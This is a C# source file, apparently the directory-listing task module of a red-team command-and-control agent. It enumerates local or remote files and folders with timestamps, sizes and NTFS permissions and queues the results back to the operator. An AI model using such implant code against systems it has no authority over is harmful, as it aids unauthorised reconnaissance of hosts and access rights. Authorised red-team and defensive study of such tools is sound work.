﻿#define COMMAND_NAME_UPPER

#if DEBUG
#define LS
#endif

#if LS

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System.Runtime.Serialization;
using ApolloInterop.Serializers;
using System.Threading;
using System.IO;
using System.Security.AccessControl;
using TT = System.Threading.Tasks;
using System.Collections.Concurrent;
using System.Globalization;

namespace Tasks
{
    public class ls : Tasking
    {

        private static int _chunkSize = 10;
        private static ACE GetAceInformation(FileSystemAccessRule ace)
        {
            ACE result = new ACE
            {
                Account = ace.IdentityReference.Value,
                Type = ace.AccessControlType.ToString(),
                Rights = ace.FileSystemRights.ToString(),
                IsInherited = ace.IsInherited
            };
            return result;
        }

        private static ACE[] GetPermissions(FileInfo fi)
        {
            List<ACE> permissions = new List<ACE>();
            try
            {
                FileSecurity fsec = fi.GetAccessControl(AccessControlSections.Access);
                foreach (FileSystemAccessRule FSAR in fsec.GetAccessRules(true, true, typeof(System.Security.Principal.NTAccount)))
                {
                    var tmp = GetAceInformation(FSAR);
                    permissions.Add(tmp);
                }
            }
            catch { }

            return permissions.ToArray();
        }
        private static ACE[] GetPermissions(DirectoryInfo di)
        {
            List<ACE> permissions = new List<ACE>();
            try
            {
                DirectorySecurity DirSec = di.GetAccessControl(AccessControlSections.Access);
                foreach (FileSystemAccessRule FSAR in DirSec.GetAccessRules(true, true, typeof(System.Security.Principal.NTAccount)))
                {
                    var tmp = GetAceInformation(FSAR);
                    permissions.Add(tmp);
                }
            }
            catch { }

            return permissions.ToArray();
        }

        private static string[] localhostAliases = new string[]
        {
            "localhost",
            "127.0.0.1",
            Environment.GetEnvironmentVariable("COMPUTERNAME").ToLower()
        };
        [DataContract]
        internal struct LsParameters
        {
            [DataMember(Name = "host")]
            public string Host;
            [DataMember(Name = "path")]
            public string Path;
        }


        private class FileDataStream
        {
            public ConcurrentQueue<FileInformation> FileQueue = new ConcurrentQueue<FileInformation>();

            public event EventHandler FileChunkReached;

            public void Add(FileInformation item)
            {
                FileQueue.Enqueue(item);
                if (FileQueue.Count >= _chunkSize)
                    FileChunkReached?.Invoke(this, null);
            }

            public IEnumerable<FileInformation> GetAll()
            {
                while(FileQueue.TryDequeue(out FileInformation t))
                {
                    yield return t;
                }
            }
        }

        public ls(IAgent agent, Task task) : base(agent, task)
        {

        }

        public override void Kill()
        {
            _cancellationToken.Cancel();
        }

        public override System.Threading.Tasks.Task CreateTasking()
        {
            return new System.Threading.Tasks.Task(() =>
            {
                LsParameters parameters = _jsonSerializer.Deserialize<LsParameters>(_data.Parameters);
                string host = localhostAliases.Contains(parameters.Host.ToLower()) ? "" : parameters.Host;
                string path = string.IsNullOrEmpty(host) ?
                              parameters.Path : $@"\\{host}\{parameters.Path}";
                if (string.IsNullOrEmpty(path))
                    path = ".";
                if (string.IsNullOrEmpty(host))
                    host = Environment.GetEnvironmentVariable("COMPUTERNAME");
                FileBrowser results = new FileBrowser
                {
                    Host = host
                };
                if (ApolloInterop.Utils.PathUtils.TryGetExactPath(path, out path))
                {
                    string errorMessage = "";
                    bool bRet = true;
                    FileDataStream ds = new FileDataStream();
                    ds.FileChunkReached += (object o, EventArgs _) =>
                    {
                        FileDataStream tmp = (FileDataStream)o;
                        List<FileInformation> tmpStore = new List<FileInformation>();
                        int i = 0;
                        while (i < 20 &&
                        tmp.FileQueue.TryDequeue(out FileInformation res))
                        {
                            tmpStore.Add(res);
                        }
                        results.Success = true;
                        results.Files = tmpStore.ToArray();
                        var tmpResp = CreateTaskResponse(
                            _jsonSerializer.Serialize(results),
                            false,
                            "",
                            new IMythicMessage[]
                            {
                                results
                            });
                        _agent.GetTaskManager().AddTaskResponseToQueue(tmpResp);
                    };
                    if (File.Exists(path))
                    {
                        try
                        {
                            var tmp = new FileInfo(path);
                            FileInformation finfo = new FileInformation(tmp, null);
                            results.IsFile = true;
                            results.Name = finfo.Name;
                            results.ParentPath = finfo.Directory;
                            results.CreationDate = finfo.CreationDate;
                            results.AccessTime = finfo.AccessTime;
                            results.ModifyTime = finfo.ModifyTime;
                            results.Size = finfo.Size;
                            try
                            {
                                results.Permissions = GetPermissions(tmp);
                            } catch { }
                            ds.Add(finfo);
                        } catch (Exception ex)
                        {
                            bRet = false;
                            errorMessage = $"Failed to get information on file {path}: {ex.Message}\n\n{ex.StackTrace}";
                        }
                    } else if (Directory.Exists(path))
                    {
                        try
                        {
                            DirectoryInfo dinfo = new DirectoryInfo(path);
                            FileInformation finfo = new FileInformation(dinfo, null);
                            results.IsFile = false;
                            results.Name = finfo.Name;
                            results.ParentPath = dinfo.Parent == null ? "" : dinfo.Parent.FullName;
                            results.AccessTime = finfo.AccessTime;
                            results.CreationDate = finfo.CreationDate;
                            results.ModifyTime = finfo.ModifyTime;
                            results.Size = finfo.Size;
                            try
                            {
                                results.Permissions = GetPermissions(dinfo);
                            } catch { }
                            string[] directories = Directory.GetDirectories(path);
                            TT.ParallelOptions po = new TT.ParallelOptions();
                            po.CancellationToken = _cancellationToken.Token;
                            po.MaxDegreeOfParallelism = 2;
                            try
                            {
                                TT.Parallel.ForEach(directories, po, (dir) =>
                                {
                                    po.CancellationToken.ThrowIfCancellationRequested();
                                    try
                                    {
                                        var tmp = new DirectoryInfo(dir);
                                        FileInformation dirInfo = new FileInformation(tmp, null);
                                        try
                                        {
                                            dirInfo.Permissions = GetPermissions(tmp);
                                        }
                                        catch { }
                                        ds.Add(dirInfo);
                                    }
                                    catch { }
                                });
                            } catch (OperationCanceledException)
                            {

                            }
                            string[] dirFiles = Directory.GetFiles(path);
                            try
                            {
                                TT.Parallel.ForEach(dirFiles, po, (f) =>
                                {
                                    po.CancellationToken.ThrowIfCancellationRequested();
                                    try
                                    {
                                        var tmp = new FileInfo(f);
                                        FileInformation newFinfo = new FileInformation(tmp, null);
                                        try
                                        {
                                            newFinfo.Permissions = GetPermissions(tmp);
                                        }
                                        catch { }
                                        ds.Add(newFinfo);
                                    }
                                    catch { }
                                });
                            }
                            catch (OperationCanceledException)
                            {

                            }
                        } catch (Exception ex)
                        {
                            bRet = false;
                            errorMessage = $"Failed to get information on directory {path}: {ex.Message}\n\n{ex.StackTrace}";
                        }
                    } else
                    {
                        bRet = false;
                        errorMessage = $"Could not find file or directory {path}";
                    }

                    results.Success = bRet;
                    results.Files = ds.GetAll().ToArray();

                    TaskResponse resp = CreateTaskResponse(
                            bRet ? _jsonSerializer.Serialize(results) : errorMessage,
                            true,
                            bRet ? "completed" : "error",
                            new IMythicMessage[]
                            {
                                results
                            });
                    _agent.GetTaskManager().AddTaskResponseToQueue(resp);
                } else
                {
                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                        $"Failed to get exact path.", true, "error"));
                }
            }, _cancellationToken.Token);
        }
    }
}
#endif